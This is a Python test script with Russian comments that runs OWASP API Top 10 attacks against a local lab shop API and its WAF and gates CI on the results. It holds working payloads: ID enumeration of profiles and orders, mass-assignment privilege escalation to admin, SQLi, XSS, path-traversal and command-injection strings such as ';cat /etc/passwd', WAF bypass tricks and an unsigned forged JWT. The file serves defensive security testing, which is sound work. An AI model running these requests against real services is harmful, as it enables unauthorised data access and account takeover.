"""Тестирование ENU Lab Shop API на уязвимости OWASP API Security Top 10 (2023).

Сценарии: API1 BOLA (перебор идентификаторов профилей и заказов, изменение чужого профиля),
API3 Mass Assignment (регистрация и обновление профиля с привилегированными полями),
классические инъекции (проверка сигнатур CRS) и попытки обхода правил WAF.

Каждый запрос сохраняется в виде HTTP-дампа (запрос + ответ) в каталог --out,
итог — в summary.json / summary.txt.

Режим --gate (для CI): код выхода 1, если хотя бы одна атака успешна
или заблокирован легитимный запрос.

Пример: python scripts/api_attack.py --base http://127.0.0.1 --host api.local --out evidence/x --label waf
"""
import argparse
import json
import os
import sys
import time
import uuid

import requests

ALIYA = ("aliya", "Aliya#2026", 101)
VICTIMS = [100, 102, 103, 104, 105]
ORDERS = [5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5011, 5012]


class Runner:
    def __init__(self, base, host, out, label):
        self.base, self.host, self.out, self.label = base.rstrip("/"), host, out, label
        self.s = requests.Session()
        self.n = 0
        self.results = []
        os.makedirs(out, exist_ok=True)

    # ----------------------------------------------------------- HTTP с сохранением дампа
    def req(self, name, method, path, *, token=None, json_body=None, raw=None, ctype=None, quiet=False):
        headers = {}
        if self.host:
            headers["Host"] = self.host
        if token:
            headers["Authorization"] = "Bearer " + token
        data = None
        if json_body is not None:
            data = json.dumps(json_body, ensure_ascii=False).encode()
            headers["Content-Type"] = "application/json"
        if raw is not None:
            data = raw.encode()
            headers["Content-Type"] = ctype or "application/json"
        elif ctype:
            headers["Content-Type"] = ctype
        url = self.base + path
        prep = requests.Request(method, url, headers=headers, data=data).prepare()
        prep.url = url          # путь отправляется как есть (без повторного кодирования)
        r = self.s.send(prep, allow_redirects=False, timeout=15)
        if not quiet:
            self.n += 1
            self._dump(f"{self.n:02d}_{name}", prep, r)
        return r

    def _dump(self, name, prep, r):
        path = prep.path_url
        lines = [f"{prep.method} {path} HTTP/1.1"]
        for k, v in prep.headers.items():
            if k.lower() in ("user-agent", "accept-encoding", "accept", "connection"):
                continue
            if k == "Authorization":
                v = v[:7 + 36] + "…"
            lines.append(f"{k}: {v}")
        body = prep.body.decode() if isinstance(prep.body, bytes) else (prep.body or "")
        lines += ["", body, "", f"HTTP/1.1 {r.status_code} {r.reason}"]
        for k, v in r.headers.items():
            if k.lower() in ("content-type", "content-length", "server", "retry-after"):
                lines.append(f"{k}: {v}")
        text = r.text
        if "<html" in text.lower():
            text = " ".join(text.split())[:300]
        lines += ["", text[:1500]]
        with open(os.path.join(self.out, name + ".txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(lines).rstrip() + "\n")

    def record(self, category, case, kind, status, success, note=""):
        """kind: attack — атака (success=True → уязвимость проэксплуатирована);
                 legit — легитимный запрос (success=True → выполнен корректно)."""
        self.results.append(dict(category=category, case=case, kind=kind, status=status, success=success, note=note))
        mark = ("УСПЕХ АТАКИ" if success else "отражена") if kind == "attack" else ("OK" if success else "ЗАБЛОКИРОВАН")
        print(f"  [{category:<5}] {case:<58} → {status:<4} {mark} {note}")

    def login(self, user, pwd, name):
        r = self.req(name, "POST", "/api/v1/login", json_body={"username": user, "password": pwd})
        return (r.json().get("token") if r.status_code == 200 and "json" in r.headers.get("Content-Type", "") else None), r


def is_json(r):
    return "application/json" in r.headers.get("Content-Type", "")


def run(base, host, out, label, bypass=True):
    R = Runner(base, host, out, label)
    tag = uuid.uuid4().hex[:6]
    print(f"== {label}: {base} (Host: {host or '-'})")

    # ---------------------------------------------------------------- легитимные запросы
    token, r = R.login(ALIYA[0], ALIYA[1], "legit_login_aliya")
    R.record("LEGIT", "Вход aliya (POST /api/v1/login)", "legit", r.status_code, token is not None)
    if not token:
        raise SystemExit("не удалось войти — стенд недоступен")
    r = R.req("legit_own_profile", "GET", f"/api/v1/users/{ALIYA[2]}/profile", token=token)
    R.record("LEGIT", "Свой профиль GET /users/101/profile", "legit", r.status_code, r.status_code == 200)
    r = R.req("legit_own_update", "PATCH", f"/api/v1/users/{ALIYA[2]}/profile", token=token,
              json_body={"phone": "+7 701 555 01 01"})
    R.record("LEGIT", "Изменение своего телефона PATCH /users/101/profile", "legit", r.status_code, r.status_code == 200)
    r = R.req("legit_register", "POST", "/api/v1/register",
              json_body={"username": f"user_{tag}", "password": "User#2026pass", "full_name": "Обычный пользователь"})
    R.record("LEGIT", "Обычная регистрация POST /register", "legit", r.status_code, r.status_code == 201)
    r = R.req("legit_products", "GET", "/api/v1/products?q=USB")
    R.record("LEGIT", "Поиск товаров GET /products?q=USB", "legit", r.status_code, r.status_code == 200)
    r = R.req("legit_own_order", "GET", "/api/v1/orders/5001", token=token)
    R.record("LEGIT", "Свой заказ GET /orders/5001", "legit", r.status_code, r.status_code == 200)

    # ---------------------------------------------------------------- API1:2023 BOLA — профили
    leaked = []
    for vid in VICTIMS:
        r = R.req(f"bola_profile_{vid}", "GET", f"/api/v1/users/{vid}/profile", token=token)
        ok = r.status_code == 200 and is_json(r) and r.json().get("id") == vid
        if ok:
            leaked.append(f"{r.json()['username']} (ИИН {r.json().get('iin', '—')})")
        R.record("API1", f"Перебор ID: GET /users/{vid}/profile", "attack", r.status_code, ok)

    # BOLA — заказы (перебор 5001..5012)
    orders_ok, codes = 0, []
    for oid in ORDERS:
        r = R.req(f"bola_order_{oid}", "GET", f"/api/v1/orders/{oid}", token=token, quiet=oid > 5004)
        codes.append(r.status_code)
        if r.status_code == 200 and is_json(r) and r.json().get("user_id") != ALIYA[2]:
            orders_ok += 1
    R.record("API1", "Перебор заказов GET /orders/5001…5012", "attack", "/".join(sorted({str(c) for c in codes})),
             orders_ok > 0, f"чужих заказов получено: {orders_ok}")

    r = R.req("bola_patch_foreign", "PATCH", "/api/v1/users/102/profile", token=token,
              json_body={"email": "attacker@evil.test"})
    R.record("API1", "Изменение чужого e-mail PATCH /users/102/profile", "attack", r.status_code,
             r.status_code == 200 and is_json(r) and r.json().get("email") == "attacker@evil.test")

    # ---------------------------------------------------------------- API3:2023 Mass Assignment
    mal = f"mallory_{tag}"
    r = R.req("ma_register_admin", "POST", "/api/v1/register",
              json_body={"username": mal, "password": "Mallory#2026", "full_name": "Mallory",
                         "role": "admin", "is_admin": True, "balance": 1000000})
    created = r.status_code == 201
    R.record("API3", "Регистрация с role=admin, is_admin=true, balance", "attack", r.status_code,
             created and is_json(r) and (r.json().get("role") == "admin" or bool(r.json().get("is_admin"))))
    if created:
        mtoken, _ = R.login(mal, "Mallory#2026", "ma_login_mallory")
        r = R.req("ma_admin_users", "GET", "/api/v1/admin/users", token=mtoken)
        R.record("API3", "  → доступ mallory к GET /admin/users", "attack", r.status_code, r.status_code == 200,
                 f"записей: {len(r.json())}" if r.status_code == 200 else "")

    r = R.req("ma_patch_is_admin", "PATCH", f"/api/v1/users/{ALIYA[2]}/profile", token=token,
              json_body={"phone": "+7 701 555 01 01", "is_admin": 1, "balance": 9999999})
    R.record("API3", "PATCH своего профиля с is_admin=1, balance", "attack", r.status_code,
             r.status_code == 200 and is_json(r) and bool(r.json().get("is_admin")))
    r = R.req("ma_admin_users_aliya", "GET", "/api/v1/admin/users", token=token)
    R.record("API3", "  → доступ aliya к GET /admin/users", "attack", r.status_code, r.status_code == 200)

    # ---------------------------------------------------------------- классические инъекции (сигнатуры CRS)
    for case, path in [
        ("SQLi UNION в ?q=", "/api/v1/products?q=%27%20UNION%20SELECT%20id,username,password,role%20FROM%20users--"),
        ("XSS в ?q=", "/api/v1/products?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"),
        ("Path traversal в ?q=", "/api/v1/products?q=../../../../etc/passwd"),
        ("RCE (команда ОС) в ?q=", "/api/v1/products?q=;cat%20/etc/passwd"),
    ]:
        r = R.req("crs_" + case.split()[0].lower(), "GET", path)
        # успех атаки = запрос дошёл до приложения (WAF не заблокировал);
        # само приложение безопасно (параметризованные запросы), поэтому оценивается только фильтрация
        R.record("CRS", case, "attack", r.status_code, r.status_code == 200, "дошёл до API" if r.status_code == 200 else "")

    # ---------------------------------------------------------------- обходы правил WAF
    if bypass:
        r = R.req("bypass_urlencoded_id", "GET", "/api/v1/users/%31%30%32/profile", token=token)
        R.record("BYPASS", "BOLA: ID в URL-кодировке /users/%31%30%32/profile", "attack", r.status_code,
                 r.status_code == 200 and is_json(r) and r.json().get("id") == 102)
        r = R.req("bypass_double_slash", "GET", "//api/v1/users/102/profile", token=token)
        R.record("BYPASS", "BOLA: двойной слэш //api/v1/users/102/profile", "attack", r.status_code,
                 r.status_code == 200 and is_json(r) and r.json().get("id") == 102)
        r = R.req("bypass_unicode_key", "PATCH", f"/api/v1/users/{ALIYA[2]}/profile", token=token,
                  raw='{"phone":"+7 701 555 01 01","\\u0069s_admin":1}')
        R.record("BYPASS", "MA: ключ в \\u-экранировании \"\\u0069s_admin\"", "attack", r.status_code,
                 r.status_code == 200 and is_json(r) and bool(r.json().get("is_admin")))
        r = R.req("bypass_duplicate_key", "PATCH", f"/api/v1/users/{ALIYA[2]}/profile", token=token,
                  raw='{"phone":"+7 701 555 01 01","role":"user","role":"admin"}')
        R.record("BYPASS", "MA: дублирующийся ключ role", "attack", r.status_code,
                 r.status_code == 200 and is_json(r) and r.json().get("role") == "admin")
        r = R.req("bypass_text_plain", "PATCH", f"/api/v1/users/{ALIYA[2]}/profile", token=token,
                  raw='{"is_admin":1}', ctype="text/plain")
        R.record("BYPASS", "MA: тело JSON с Content-Type text/plain", "attack", r.status_code,
                 r.status_code == 200 and is_json(r) and bool(r.json().get("is_admin")))
        r = R.req("bypass_vnd_json", "PATCH", f"/api/v1/users/{ALIYA[2]}/profile", token=token,
                  raw='{"is_admin":1}', ctype="application/vnd.api+json")
        R.record("BYPASS", "MA: Content-Type application/vnd.api+json", "attack", r.status_code,
                 r.status_code == 200 and is_json(r) and bool(r.json().get("is_admin")))
        forged = token.split(".")
        import base64
        payload = json.loads(base64.urlsafe_b64decode(forged[1] + "=="))
        payload["sub"], payload["role"] = "102", "admin"
        forged[1] = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode().rstrip("=")
        r = R.req("bypass_forged_jwt", "GET", "/api/v1/users/102/profile", token=".".join(forged))
        R.record("BYPASS", "BOLA: подделанный JWT (sub=102, role=admin) без подписи", "attack", r.status_code,
                 r.status_code == 200, "API проверяет подпись" if r.status_code == 401 else "")

    # ---------------------------------------------------------------- итог
    attacks = [x for x in R.results if x["kind"] == "attack"]
    legit = [x for x in R.results if x["kind"] == "legit"]
    summary = dict(label=label, base=base, leaked_profiles=leaked,
                   attacks_total=len(attacks), attacks_success=sum(x["success"] for x in attacks),
                   legit_total=len(legit), legit_blocked=sum(not x["success"] for x in legit),
                   results=R.results, ts=time.strftime("%Y-%m-%d %H:%M:%S"))
    with open(os.path.join(out, "summary.json"), "w", encoding="utf-8") as f:
        json.dump(summary, f, ensure_ascii=False, indent=1)
    line = (f"ИТОГ [{label}]: атак успешно {summary['attacks_success']}/{summary['attacks_total']}, "
            f"легитимных заблокировано {summary['legit_blocked']}/{summary['legit_total']}")
    print(line)
    if leaked:
        print("  утечка профилей:", ", ".join(leaked))
    return summary


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:5000")
    ap.add_argument("--host", default="")
    ap.add_argument("--out", default="evidence/attack")
    ap.add_argument("--label", default="run")
    ap.add_argument("--no-bypass", action="store_true")
    ap.add_argument("--gate", action="store_true", help="CI: выход 1 при успешной атаке или ложном срабатывании")
    a = ap.parse_args()
    s = run(a.base, a.host, a.out, a.label, bypass=not a.no_bypass)
    if a.gate and (s["attacks_success"] or s["legit_blocked"]):
        print("GATE FAILED")
        sys.exit(1)
    if a.gate:
        print("GATE PASSED")


if __name__ == "__main__":
    main()
